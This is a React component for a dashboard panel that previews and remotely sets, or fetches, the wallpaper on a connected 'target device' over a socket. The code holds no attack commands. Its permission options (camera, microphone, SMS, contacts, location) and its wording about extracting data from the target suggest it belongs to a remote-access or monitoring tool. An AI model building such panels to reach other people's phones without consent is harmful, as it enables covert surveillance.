"use client";

import React, { useState, useEffect, useRef } from 'react';
import { 
    Wallpaper, Upload, Sparkles, Check, CheckCircle2, AlertCircle, 
    Smartphone, Lock, Home, RefreshCw, X, Image as ImageIcon,
    Wifi, BatteryCharging, ArrowRight
} from 'lucide-react';

interface WallpaperViewProps {
    socket: any;
    userUuid: string;
    selectedDeviceId: string | null;
    isOnline: boolean;
    onTriggerOffline: () => void;
    requireConnectedDevice: (
        action: (targetId: string) => void, 
        options?: {
            actionName?: string;
            requiredPermission?: 'camera' | 'microphone' | 'location' | 'storage' | 'sms' | 'contacts' | 'notifications';
            permissionLabel?: string;
        } | string
    ) => boolean;
}

interface PresetWallpaper {
    id: string;
    name: string;
    tag: string;
    url: string;
    thumb: string;
}

const PRESET_WALLPAPERS: PresetWallpaper[] = [
    {
        id: 'cyber_grid',
        name: 'Cyber Grid',
        tag: 'Matrix',
        url: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1080&h=2340&q=85',
        thumb: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=360&h=780&q=75'
    },
    {
        id: 'neon_tokyo',
        name: 'Neon Tokyo',
        tag: 'Cyberpunk',
        url: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?auto=format&fit=crop&w=1080&h=2340&q=85',
        thumb: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?auto=format&fit=crop&w=360&h=780&q=75'
    },
    {
        id: 'deep_space',
        name: 'Cosmic Nebula',
        tag: 'AMOLED',
        url: 'https://images.unsplash.com/photo-1506703719100-a0f3a48c0f86?auto=format&fit=crop&w=1080&h=2340&q=85',
        thumb: 'https://images.unsplash.com/photo-1506703719100-a0f3a48c0f86?auto=format&fit=crop&w=360&h=780&q=75'
    },
    {
        id: 'dark_peaks',
        name: 'Dark Peaks',
        tag: 'Minimal',
        url: 'https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?auto=format&fit=crop&w=1080&h=2340&q=85',
        thumb: 'https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?auto=format&fit=crop&w=360&h=780&q=75'
    },
    {
        id: 'crimson_horizon',
        name: 'Crimson Flow',
        tag: 'Abstract',
        url: 'https://images.unsplash.com/photo-1550684848-fac1c5b4e853?auto=format&fit=crop&w=1080&h=2340&q=85',
        thumb: 'https://images.unsplash.com/photo-1550684848-fac1c5b4e853?auto=format&fit=crop&w=360&h=780&q=75'
    },
    {
        id: 'synthwave',
        name: 'Synthwave Sun',
        tag: 'Retro',
        url: 'https://images.unsplash.com/photo-1518709268805-4e9042af9f23?auto=format&fit=crop&w=1080&h=2340&q=85',
        thumb: 'https://images.unsplash.com/photo-1518709268805-4e9042af9f23?auto=format&fit=crop&w=360&h=780&q=75'
    },
    {
        id: 'emerald_aurora',
        name: 'Emerald Aurora',
        tag: 'Nature',
        url: 'https://images.unsplash.com/photo-1531366936337-7c912a4589a7?auto=format&fit=crop&w=1080&h=2340&q=85',
        thumb: 'https://images.unsplash.com/photo-1531366936337-7c912a4589a7?auto=format&fit=crop&w=360&h=780&q=75'
    },
    {
        id: 'obsidian_liquid',
        name: 'Obsidian Fluid',
        tag: 'Dark 4K',
        url: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=1080&h=2340&q=85',
        thumb: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=360&h=780&q=75'
    }
];

export default function WallpaperView({
    socket,
    userUuid,
    selectedDeviceId,
    isOnline,
    onTriggerOffline,
    requireConnectedDevice
}: WallpaperViewProps) {
    const [activeTab, setActiveTab] = useState<'presets' | 'custom'>('presets');
    const [deviceWallpaper, setDeviceWallpaper] = useState<string>(PRESET_WALLPAPERS[0].url);
    const [stagedWallpaper, setStagedWallpaper] = useState<string | null>(null);
    const [selectedPresetId, setSelectedPresetId] = useState<string | null>(PRESET_WALLPAPERS[0].id);
    const [customImageBase64, setCustomImageBase64] = useState<string | null>(null);
    const [customFileName, setCustomFileName] = useState<string>('');
    const [targetScreen, setTargetScreen] = useState<'both' | 'home' | 'lock'>('both');
    const [isApplying, setIsApplying] = useState<boolean>(false);
    const [isFetchingCurrent, setIsFetchingCurrent] = useState<boolean>(false);
    const [justApplied, setJustApplied] = useState<boolean>(false);
    const [toastMessage, setToastMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
    const [permissionErrorModal, setPermissionErrorModal] = useState<boolean>(false);
    const fileInputRef = useRef<HTMLInputElement>(null);

    // Load persistent wallpaper preview per device & preload presets
    useEffect(() => {
        // Preload preset images in background for zero-latency browsing
        PRESET_WALLPAPERS.forEach((p) => {
            const img = new Image();
            img.src = p.url;
        });
    }, []);

    // Restore last wallpaper for selected device on mount / device change
    useEffect(() => {
        if (typeof window === 'undefined') return;
        const targetKey = selectedDeviceId ? `wallpaper_active_${selectedDeviceId}` : 'wallpaper_active_last';
        const raw = localStorage.getItem(targetKey) || localStorage.getItem('wallpaper_active_last');
        if (raw) {
            try {
                const parsed = JSON.parse(raw);
                if (parsed.wallpaper) {
                    setDeviceWallpaper(parsed.wallpaper);
                    setStagedWallpaper(null);
                    if (parsed.presetId && PRESET_WALLPAPERS.some(p => p.id === parsed.presetId)) {
                        setSelectedPresetId(parsed.presetId);
                    } else {
                        setSelectedPresetId(null);
                    }
                    return;
                }
            } catch (_) {}
        }
        // Fallback backward-compat with old cache format if present
        const oldKey = selectedDeviceId ? `wallpaper_cache_${selectedDeviceId}` : 'wallpaper_cache_last';
        const oldRaw = localStorage.getItem(oldKey) || localStorage.getItem('wallpaper_cache_last');
        if (oldRaw) {
            try {
                const parsed = JSON.parse(oldRaw);
                if (parsed.customImage) {
                    setDeviceWallpaper(parsed.customImage);
                    setStagedWallpaper(null);
                    setSelectedPresetId(null);
                } else if (parsed.presetId) {
                    const found = PRESET_WALLPAPERS.find(p => p.id === parsed.presetId);
                    if (found) {
                        setDeviceWallpaper(found.url);
                        setSelectedPresetId(found.id);
                        setStagedWallpaper(null);
                    }
                }
            } catch (_) {}
        }
    }, [selectedDeviceId]);

    // Active image source for preview: Staged preview overrides until cleared/applied, else live device wallpaper
    const displayedPreviewSrc = stagedWallpaper || deviceWallpaper;

    // Keep refs fresh for socket listeners to eliminate any stale closures
    const displayedPreviewRef = useRef(displayedPreviewSrc);
    displayedPreviewRef.current = displayedPreviewSrc;
    const selectedPresetIdRef = useRef(selectedPresetId);
    selectedPresetIdRef.current = selectedPresetId;
    const selectedDeviceIdRef = useRef(selectedDeviceId);
    selectedDeviceIdRef.current = selectedDeviceId;

    // Save wallpaper cache utility
    const saveWallpaperCache = (deviceId: string | null, wallUrl: string, presetId: string | null) => {
        if (typeof window === 'undefined') return;
        try {
            const cacheData = {
                wallpaper: wallUrl,
                presetId: presetId,
                updatedAt: Date.now()
            };
            if (deviceId) {
                localStorage.setItem(`wallpaper_active_${deviceId}`, JSON.stringify(cacheData));
            }
            localStorage.setItem('wallpaper_active_last', JSON.stringify(cacheData));
        } catch (_) {}
    };

    // Listen to wallpaper_status and current_wallpaper_data from socket
    useEffect(() => {
        if (!socket) return;

        const handleStatus = (data: any) => {
            setIsApplying(false);
            if (data?.success) {
                setJustApplied(true);
                setTimeout(() => setJustApplied(false), 4000);

                const appliedSrc = displayedPreviewRef.current;
                setDeviceWallpaper(appliedSrc);
                setStagedWallpaper(null);

                // Persist current wallpaper preview for this device
                saveWallpaperCache(selectedDeviceIdRef.current, appliedSrc, selectedPresetIdRef.current);

                const screenLabel = data?.target === 'home' ? 'Home Screen' : data?.target === 'lock' ? 'Lock Screen' : 'Both Screens';
                setToastMessage({
                    type: 'success',
                    text: `Wallpaper updated on ${screenLabel}`
                });
            } else {
                setToastMessage({
                    type: 'error',
                    text: data?.message || 'Failed to update wallpaper.'
                });
            }
            setTimeout(() => setToastMessage(null), 4500);
        };

        const handleCurrentData = (data: any) => {
            setIsFetchingCurrent(false);
            if (data?.success && data?.image) {
                // Update live device wallpaper directly on phone screen without switching tabs
                setDeviceWallpaper(data.image);
                setStagedWallpaper(null);
                setSelectedPresetId(null);
                setCustomImageBase64(null);
                setCustomFileName('Device Wallpaper');

                saveWallpaperCache(selectedDeviceIdRef.current, data.image, null);

                setToastMessage({
                    type: 'success',
                    text: 'Current wallpaper fetched from device!'
                });
            } else {
                const msg = data?.message || '';
                if (msg.toLowerCase().includes('permission') || msg.toLowerCase().includes('not enabled')) {
                    setPermissionErrorModal(true);
                } else {
                    setToastMessage({
                        type: 'error',
                        text: msg || 'Could not fetch device wallpaper.'
                    });
                }
            }
            setTimeout(() => setToastMessage(null), 4500);
        };

        socket.on('wallpaper_status', handleStatus);
        socket.on('current_wallpaper_data', handleCurrentData);
        return () => {
            socket.off('wallpaper_status', handleStatus);
            socket.off('current_wallpaper_data', handleCurrentData);
        };
    }, [socket]);

    // Fast client-side image compression before base64 upload
    const compressImage = (dataUrl: string, maxW = 1080, maxH = 2340): Promise<string> => {
        return new Promise((resolve) => {
            const img = new Image();
            img.onload = () => {
                let { width, height } = img;
                if (width > maxW || height > maxH) {
                    const ratio = Math.min(maxW / width, maxH / height);
                    width = Math.round(width * ratio);
                    height = Math.round(height * ratio);
                }
                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                if (ctx) {
                    ctx.drawImage(img, 0, 0, width, height);
                    resolve(canvas.toDataURL('image/jpeg', 0.85));
                } else {
                    resolve(dataUrl);
                }
            };
            img.onerror = () => resolve(dataUrl);
            img.src = dataUrl;
        });
    };

    const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0];
        if (!file) return;

        if (file.size > 20 * 1024 * 1024) {
            setToastMessage({ type: 'error', text: 'Image exceeds 20MB limit.' });
            setTimeout(() => setToastMessage(null), 4000);
            return;
        }

        setCustomFileName(file.name);
        const reader = new FileReader();
        reader.onload = async (event) => {
            const rawResult = event.target?.result as string;
            if (rawResult) {
                // Compress client-side to prevent socket freeze and guarantee <150ms transfer
                const compressed = await compressImage(rawResult);
                setCustomImageBase64(compressed);
                setStagedWallpaper(compressed);
                setSelectedPresetId(null);
                setActiveTab('custom');
            }
        };
        reader.readAsDataURL(file);
    };

    const handleApplyWallpaper = () => {
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId;
            if (!effectiveTarget || !socket || !userUuid) {
                onTriggerOffline();
                return;
            }

            const imagePayload = displayedPreviewSrc;

            if (!imagePayload) {
                setToastMessage({ type: 'error', text: 'Select a wallpaper first.' });
                setTimeout(() => setToastMessage(null), 3000);
                return;
            }

            setIsApplying(true);

            // Optimistically update device cache
            saveWallpaperCache(effectiveTarget, imagePayload, selectedPresetId);

            socket.emit('set_wallpaper', {
                uuid: userUuid,
                targetDeviceId: effectiveTarget,
                image: imagePayload,
                target: targetScreen,
                type: selectedPresetId ? 'preset' : 'custom'
            });

            setTimeout(() => {
                setIsApplying((prev) => {
                    if (prev) {
                        setToastMessage({ type: 'error', text: 'Device timed out or asleep.' });
                        setTimeout(() => setToastMessage(null), 4000);
                        return false;
                    }
                    return false;
                });
            }, 18000);
        }, { actionName: 'Wallpaper Changer' });
    };

    const handleFetchCurrentWallpaper = () => {
        const effectiveTarget = selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
        if (!effectiveTarget) {
            setToastMessage({ type: 'error', text: 'Select a target device first.' });
            setTimeout(() => setToastMessage(null), 3000);
            return;
        }

        // Fast Client-side pre-check for All Files / Storage permission
        if (typeof window !== 'undefined') {
            try {
                const rawPerms = localStorage.getItem(`permissions_${effectiveTarget}`);
                if (rawPerms) {
                    const perms = JSON.parse(rawPerms);
                    if (perms && perms.fileManager === false && perms.storage === false) {
                        setPermissionErrorModal(true);
                        return;
                    }
                }
            } catch (_) {}
        }

        requireConnectedDevice((targetId) => {
            const id = targetId || effectiveTarget;
            if (!id || !socket || !userUuid) {
                onTriggerOffline();
                return;
            }

            setIsFetchingCurrent(true);
            socket.emit('get_current_wallpaper', {
                uuid: userUuid,
                targetDeviceId: id
            });

            setTimeout(() => {
                setIsFetchingCurrent((prev) => {
                    if (prev) {
                        setToastMessage({ type: 'error', text: 'Device timed out or asleep.' });
                        setTimeout(() => setToastMessage(null), 4000);
                        return false;
                    }
                    return false;
                });
            }, 15000);
        }, { actionName: 'Fetch Current Wallpaper', requiredPermission: 'storage', permissionLabel: 'All Files Manager / Storage' });
    };

    return (
        <div className="max-w-5xl mx-auto space-y-6 animate-in fade-in zoom-in-95 duration-200 pb-16 relative">
            
            {/* ── All Files Manager Permission Error Modal ── */}
            {permissionErrorModal && (
                <div className="fixed inset-0 z-[400] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-in fade-in duration-200">
                    <div className="clay-card p-6 max-w-sm w-full text-center space-y-4 border border-rose-500/30 shadow-[0_0_50px_rgba(244,63,94,0.3)] relative animate-in zoom-in-95 duration-200">
                        <button
                            type="button"
                            onClick={() => setPermissionErrorModal(false)}
                            className="absolute top-4 right-4 text-white/40 hover:text-white transition-colors cursor-pointer"
                        >
                            <X size={16} />
                        </button>
                        <div className="w-14 h-14 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400 mx-auto shadow-inner">
                            <AlertCircle size={28} />
                        </div>
                        <div>
                            <h3 className="text-sm font-black text-white uppercase tracking-wider font-mono">Permission Required</h3>
                            <p className="text-xs text-white/70 mt-2 leading-relaxed">
                                Target device par <span className="text-orange-400 font-bold">All File Manager / Storage Permission</span> enable nahi hai. Current wallpaper live extract karnay ke liye device par All Files permission ka hona zaroori hai.
                            </p>
                        </div>
                        <button
                            type="button"
                            onClick={() => setPermissionErrorModal(false)}
                            className="w-full py-2.5 rounded-xl bg-gradient-to-r from-orange-500 to-amber-500 text-black font-mono font-black text-xs shadow-[0_4px_16px_rgba(249,115,22,0.3)] hover:opacity-95 transition-all cursor-pointer"
                        >
                            Understood
                        </button>
                    </div>
                </div>
            )}

            {/* ── Sleek Floating Dark Glass Toast (No Ugly Green Banners) ── */}
            {toastMessage && (
                <div className="fixed top-16 left-1/2 -translate-x-1/2 z-[200] pointer-events-none">
                    <div className={`px-4 py-2.5 rounded-2xl backdrop-blur-2xl border flex items-center gap-2.5 shadow-[0_15px_40px_rgba(0,0,0,0.95)] animate-in fade-in slide-in-from-top-3 duration-200 ${
                        toastMessage.type === 'success'
                            ? 'bg-[#12141a]/95 border-orange-500/40 text-orange-200 shadow-[0_0_25px_rgba(249,115,22,0.25)]'
                            : 'bg-[#181114]/95 border-rose-500/40 text-rose-200 shadow-[0_0_25px_rgba(244,63,94,0.25)]'
                    }`}>
                        {toastMessage.type === 'success' ? (
                            <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse shadow-[0_0_8px_#f97316]" />
                        ) : (
                            <AlertCircle size={14} className="text-rose-400 shrink-0" />
                        )}
                        <span className="text-xs font-mono font-bold tracking-tight">{toastMessage.text}</span>
                    </div>
                </div>
            )}

            {/* ── Main Two-Column Layout ── */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
                
                {/* ── Left Column: Enhanced Ultra-Sleek 3D Phone Shell (5 cols) ── */}
                <div className="lg:col-span-5 flex flex-col items-center">
                    <div className="clay-card p-5 sm:p-6 w-full flex flex-col items-center relative overflow-hidden">
                        
                        {/* ── Tactical 3D Smartphone Chassis ── */}
                        <div className="w-[260px] sm:w-[280px] h-[520px] sm:h-[560px] rounded-[3.2rem] bg-[#0c0d12] p-3 relative shadow-[0_30px_90px_rgba(0,0,0,0.95),inset_0_1px_2px_rgba(255,255,255,0.18),0_0_0_1px_rgba(255,255,255,0.06)] border-[4px] border-[#1c1f28]">
                            
                            {/* Realistic Hardware Side Button Accents */}
                            <div className="absolute -left-[6px] top-28 w-[3px] h-8 bg-white/20 rounded-l-sm" />
                            <div className="absolute -left-[6px] top-40 w-[3px] h-12 bg-white/20 rounded-l-sm" />
                            <div className="absolute -right-[6px] top-32 w-[3px] h-14 bg-white/20 rounded-r-sm" />

                            {/* Inner Glass Display Bezel */}
                            <div className="w-full h-full rounded-[2.5rem] overflow-hidden relative flex flex-col justify-between bg-black select-none shadow-inner">
                                
                                {/* Background Image */}
                                <div className="absolute inset-0 z-0">
                                    <img 
                                        src={displayedPreviewSrc} 
                                        alt="Wallpaper Preview" 
                                        className="w-full h-full object-cover transition-opacity duration-300 ease-out" 
                                    />
                                    {/* Ultra-subtle gradient overlay for UI elements */}
                                    <div className="absolute inset-0 bg-gradient-to-b from-black/55 via-transparent to-black/60 pointer-events-none" />
                                    {/* Diagonal Glass Sheen Reflection */}
                                    <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/[0.03] to-transparent pointer-events-none" />
                                </div>

                                {/* Dynamic Island Capsule */}
                                <div className="relative z-20 w-full pt-2 flex justify-center">
                                    <div className="w-20 h-4 bg-black rounded-full flex items-center justify-end px-2.5 border border-white/10 shadow-lg">
                                        <div className="w-1.5 h-1.5 rounded-full bg-blue-400/40 animate-pulse" />
                                    </div>
                                </div>

                                {/* Status Bar */}
                                <div className="relative z-20 px-5 flex items-center justify-between text-[10px] font-mono text-white/90 drop-shadow">
                                    <span className="font-bold">09:41</span>
                                    <div className="flex items-center gap-1.5">
                                        <Wifi size={11} />
                                        <BatteryCharging size={13} className="text-emerald-400" />
                                    </div>
                                </div>

                                {/* Display Content: Home vs Lock */}
                                {targetScreen === 'lock' ? (
                                    /* Lock Screen Mode */
                                    <div className="relative z-20 flex-1 flex flex-col items-center justify-between py-6 px-4">
                                        <div className="flex flex-col items-center mt-6">
                                            <Lock size={14} className="text-white/70 mb-2 drop-shadow" />
                                            <div className="text-5xl font-black text-white font-sans tracking-tight drop-shadow-lg">
                                                09:41
                                            </div>
                                            <div className="text-xs font-medium text-white/80 drop-shadow mt-1">
                                                Wednesday, October 18
                                            </div>
                                        </div>

                                        <div className="text-[9px] font-mono text-white/60 tracking-wider uppercase animate-pulse drop-shadow">
                                            Swipe up to unlock
                                        </div>
                                    </div>
                                ) : (
                                    /* Home Screen Mode */
                                    <div className="relative z-20 flex-1 flex flex-col justify-between py-5 px-3">
                                        {/* Minimal Weather Pill */}
                                        <div className="bg-black/35 backdrop-blur-md border border-white/10 rounded-2xl p-2 mx-2 text-white/90 shadow-lg">
                                            <div className="text-[10px] font-bold">24° Sunny</div>
                                        </div>

                                        {/* Clean App Grid */}
                                        <div className="grid grid-cols-4 gap-2 px-2 my-auto">
                                            {['Phone', 'Chat', 'Gallery', 'Music', 'Camera', 'Maps', 'Web', 'Files'].map((app, idx) => (
                                                <div key={idx} className="flex flex-col items-center gap-1">
                                                    <div className="w-9 h-9 rounded-xl bg-white/15 backdrop-blur-md border border-white/20 shadow flex items-center justify-center text-white/90 text-[11px] font-black">
                                                        {app[0]}
                                                    </div>
                                                    <span className="text-[8px] font-medium text-white/80 drop-shadow truncate w-full text-center">
                                                        {app}
                                                    </span>
                                                </div>
                                            ))}
                                        </div>

                                        {/* Bottom Glass Dock */}
                                        <div className="bg-white/10 backdrop-blur-md rounded-2xl p-1.5 mx-1 flex items-center justify-around border border-white/15 shadow">
                                            {['📞', '💬', '🌐', '📷'].map((icon, idx) => (
                                                <div key={idx} className="w-7 h-7 rounded-lg bg-black/40 flex items-center justify-center text-xs">
                                                    {icon}
                                                </div>
                                            ))}
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>

                        {/* Screen Target Segmented Controller */}
                        <div className="w-full mt-5">
                            <div className="grid grid-cols-3 gap-1.5 p-1 rounded-2xl bg-[#0c0d12] border border-white/10 shadow-inner">
                                {[
                                    { id: 'both', label: 'Both', icon: Smartphone },
                                    { id: 'home', label: 'Home', icon: Home },
                                    { id: 'lock', label: 'Lock', icon: Lock }
                                ].map((tab) => {
                                    const active = targetScreen === tab.id;
                                    const Icon = tab.icon;
                                    return (
                                        <button
                                            key={tab.id}
                                            type="button"
                                            onClick={() => setTargetScreen(tab.id as any)}
                                            className={`py-2 px-2 rounded-xl flex items-center justify-center gap-1.5 text-xs font-mono font-bold transition-colors cursor-pointer ${
                                                active
                                                    ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-black font-black shadow-[0_2px_12px_rgba(249,115,22,0.35)]'
                                                    : 'text-white/50 hover:text-white hover:bg-white/5'
                                            }`}
                                        >
                                            <Icon size={12} />
                                            <span>{tab.label}</span>
                                        </button>
                                    );
                                })}
                            </div>
                        </div>

                        {/* Staged vs Active Status Pill */}
                        {stagedWallpaper && stagedWallpaper !== deviceWallpaper ? (
                            <div className="w-full mt-3 px-3 py-1.5 rounded-xl bg-orange-500/10 border border-orange-500/30 flex items-center justify-between text-[11px] font-mono text-orange-300 animate-in fade-in duration-200">
                                <span className="flex items-center gap-1.5 font-bold">
                                    <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
                                    Previewing Staged
                                </span>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setStagedWallpaper(null);
                                        setSelectedPresetId(null);
                                    }}
                                    className="text-[10px] text-white/60 hover:text-white underline cursor-pointer"
                                >
                                    Revert
                                </button>
                            </div>
                        ) : (
                            <div className="w-full mt-3 px-3 py-1 rounded-xl bg-white/[0.03] border border-white/5 flex items-center justify-center gap-1.5 text-[10px] font-mono text-white/50">
                                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                                <span>Current Active Wallpaper</span>
                            </div>
                        )}

                        {/* Quick Action: Ultra-light Fetch Live Wallpaper From Target Device */}
                        <button
                            type="button"
                            onClick={handleFetchCurrentWallpaper}
                            disabled={isFetchingCurrent}
                            className="w-full mt-2.5 py-2 px-3 rounded-xl bg-white/[0.04] hover:bg-white/[0.08] active:bg-white/[0.12] border border-white/10 flex items-center justify-center gap-2 text-xs font-mono font-medium text-white/70 hover:text-white transition-all cursor-pointer disabled:opacity-50"
                        >
                            <RefreshCw size={12} className={isFetchingCurrent ? 'animate-spin text-orange-400' : 'text-orange-400/80'} />
                            <span>{isFetchingCurrent ? 'Fetching From Device...' : 'Fetch Device Wallpaper'}</span>
                        </button>
                    </div>
                </div>

                {/* ── Right Column: Source Tabs & Wallpapers (7 cols) ── */}
                <div className="lg:col-span-7 space-y-5">
                    
                    {/* Source Switcher: Preload vs Custom Upload */}
                    <div className="clay-card p-1.5 sm:p-2 flex items-center gap-2">
                        <button
                            type="button"
                            onClick={() => setActiveTab('presets')}
                            className={`flex-1 py-2.5 px-4 rounded-xl flex items-center justify-center gap-2 text-xs font-mono font-bold transition-all cursor-pointer ${
                                activeTab === 'presets'
                                    ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-black font-black shadow-[0_4px_16px_rgba(249,115,22,0.3)]'
                                    : 'text-white/60 hover:text-white hover:bg-white/5'
                            }`}
                        >
                            <Sparkles size={14} />
                            <span>Preload</span>
                        </button>

                        <button
                            type="button"
                            onClick={() => setActiveTab('custom')}
                            className={`flex-1 py-2.5 px-4 rounded-xl flex items-center justify-center gap-2 text-xs font-mono font-bold transition-all cursor-pointer ${
                                activeTab === 'custom'
                                    ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-black font-black shadow-[0_4px_16px_rgba(249,115,22,0.3)]'
                                    : 'text-white/60 hover:text-white hover:bg-white/5'
                            }`}
                        >
                            <Upload size={14} />
                            <span>Custom Upload {customImageBase64 ? '✓' : ''}</span>
                        </button>
                    </div>

                    {/* Tab 1: Preload Gallery Grid (Zero Layout Shift, Pure Vertical Proportions) */}
                    {activeTab === 'presets' && (
                        <div className="clay-card p-4 sm:p-5">
                            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 max-h-[420px] overflow-y-auto custom-scrollbar pr-1">
                                {PRESET_WALLPAPERS.map((preset) => {
                                    const isSelected = stagedWallpaper 
                                        ? stagedWallpaper === preset.url 
                                        : (selectedPresetId === preset.id && displayedPreviewSrc === preset.url);
                                    return (
                                        <button
                                            key={preset.id}
                                            type="button"
                                            onClick={() => {
                                                if (stagedWallpaper === preset.url) {
                                                    setStagedWallpaper(null);
                                                    setSelectedPresetId(null);
                                                } else {
                                                    setSelectedPresetId(preset.id);
                                                    setStagedWallpaper(preset.url);
                                                }
                                            }}
                                            className={`group relative rounded-2xl overflow-hidden aspect-[9/18] transition-all cursor-pointer border text-left flex flex-col justify-between p-2.5 ${
                                                isSelected 
                                                    ? 'border-orange-500 shadow-[0_0_20px_rgba(249,115,22,0.45)] ring-2 ring-orange-400/50' 
                                                    : 'border-white/10 hover:border-white/25'
                                            }`}
                                        >
                                            {/* Thumbnail Image */}
                                            <img 
                                                src={preset.thumb} 
                                                alt={preset.name} 
                                                loading="eager"
                                                className="absolute inset-0 w-full h-full object-cover transition-transform duration-300 group-hover:scale-105" 
                                            />
                                            {/* Gradient Overlay */}
                                            <div className="absolute inset-0 bg-gradient-to-t from-black/85 via-black/15 to-black/30" />

                                            {/* Top Selection Check */}
                                            <div className="relative z-10 flex justify-end">
                                                {isSelected ? (
                                                    <div className="w-5 h-5 rounded-full bg-orange-500 text-black flex items-center justify-center shadow-lg">
                                                        <Check size={12} strokeWidth={3} />
                                                    </div>
                                                ) : (
                                                    <span className="text-[9px] font-mono text-white/70 px-1.5 py-0.5 rounded bg-black/50 border border-white/10 backdrop-blur-sm">
                                                        {preset.tag}
                                                    </span>
                                                )}
                                            </div>

                                            {/* Bottom Info Label */}
                                            <div className="relative z-10">
                                                <div className="text-[11px] font-bold text-white drop-shadow truncate">
                                                    {preset.name}
                                                </div>
                                            </div>
                                        </button>
                                    );
                                })}
                            </div>
                        </div>
                    )}

                    {/* Tab 2: Custom Upload Zone */}
                    {activeTab === 'custom' && (
                        <div className="clay-card p-5 sm:p-6 space-y-4">
                            <div className="flex items-center justify-between pb-2 border-b border-white/5">
                                <h3 className="text-xs sm:text-sm font-black text-white">Upload Custom Image</h3>
                                {customImageBase64 && (
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (stagedWallpaper === customImageBase64) {
                                                setStagedWallpaper(null);
                                            }
                                            setCustomImageBase64(null);
                                            setCustomFileName('');
                                            if (fileInputRef.current) fileInputRef.current.value = '';
                                        }}
                                        className="text-[10px] font-mono text-rose-400 hover:text-rose-300 px-2 py-1 rounded-lg bg-rose-500/10 border border-rose-500/20 transition-colors cursor-pointer flex items-center gap-1"
                                    >
                                        <X size={11} /> Clear
                                    </button>
                                )}
                            </div>

                            <input 
                                ref={fileInputRef}
                                type="file" 
                                accept="image/png,image/jpeg,image/webp,image/jpg" 
                                onChange={handleFileUpload} 
                                className="hidden" 
                            />

                            {customImageBase64 ? (
                                /* Uploaded Image Card */
                                <div className="p-4 rounded-2xl bg-[#0c0d12] border border-orange-500/30 flex items-center justify-between gap-4 shadow-inner">
                                    <div className="flex items-center gap-3">
                                        <div className="w-14 h-14 rounded-xl overflow-hidden border border-white/20 shrink-0">
                                            <img src={customImageBase64} alt="Custom" className="w-full h-full object-cover" />
                                        </div>
                                        <div>
                                            <div className="text-xs font-bold text-white truncate max-w-[200px] sm:max-w-xs">
                                                {customFileName || 'custom_wallpaper.jpg'}
                                            </div>
                                            <div className="text-[10px] font-mono text-emerald-400 flex items-center gap-1 mt-0.5">
                                                <CheckCircle2 size={11} /> Ready to deploy
                                            </div>
                                        </div>
                                    </div>

                                    <button
                                        type="button"
                                        onClick={() => fileInputRef.current?.click()}
                                        className="px-3 py-1.5 rounded-xl bg-white/5 hover:bg-white/10 text-white/80 hover:text-white text-xs font-mono font-bold transition-all cursor-pointer border border-white/10"
                                    >
                                        Replace
                                    </button>
                                </div>
                            ) : (
                                /* Clean Drag & Drop Upload Zone */
                                <div 
                                    onClick={() => fileInputRef.current?.click()}
                                    className="p-10 sm:p-14 border-2 border-dashed border-white/15 hover:border-orange-500/60 rounded-3xl flex flex-col items-center justify-center text-center cursor-pointer transition-all hover:bg-white/[0.02] group"
                                >
                                    <div className="clay-icon-pod w-14 h-14 rounded-2xl flex items-center justify-center text-orange-400 group-hover:scale-110 transition-transform mb-3 border-orange-500/30 shadow-[0_0_20px_rgba(249,115,22,0.2)]">
                                        <Upload size={22} className="text-orange-400" />
                                    </div>
                                    <h4 className="text-xs sm:text-sm font-bold text-white mb-1">Click to browse or drop an image here</h4>
                                    <p className="text-[10px] font-mono text-white/40">PNG, JPG, JPEG, WebP</p>
                                </div>
                            )}
                        </div>
                    )}

                    {/* ── Master Action HUD Button (Clean, No Clutter Labels) ── */}
                    <div className="clay-card p-4 sm:p-5">
                        <button
                            type="button"
                            onClick={handleApplyWallpaper}
                            disabled={isApplying}
                            className={`w-full py-4 px-6 rounded-2xl flex items-center justify-center gap-2.5 text-xs sm:text-sm font-black font-mono uppercase tracking-wider transition-all cursor-pointer shadow-lg active:scale-98 ${
                                isApplying
                                    ? 'bg-orange-500/40 text-black/60 cursor-not-allowed'
                                    : justApplied
                                    ? 'bg-gradient-to-r from-emerald-500 to-teal-400 text-black shadow-[0_8px_30px_rgba(16,185,129,0.35)]'
                                    : 'bg-gradient-to-r from-orange-500 via-amber-500 to-orange-500 hover:brightness-110 text-black shadow-[0_8px_30px_rgba(249,115,22,0.4)] hover:scale-[1.01]'
                            }`}
                        >
                            {isApplying ? (
                                <>
                                    <RefreshCw size={16} className="animate-spin text-black" />
                                    <span>Applying Wallpaper...</span>
                                </>
                            ) : justApplied ? (
                                <>
                                    <CheckCircle2 size={16} className="text-black" />
                                    <span>Wallpaper Applied!</span>
                                </>
                            ) : (
                                <>
                                    <Sparkles size={16} className="text-black" />
                                    <span>Apply Wallpaper Now</span>
                                    <ArrowRight size={15} className="text-black ml-1" />
                                </>
                            )}
                        </button>
                    </div>

                </div>
            </div>
        </div>
    );
}
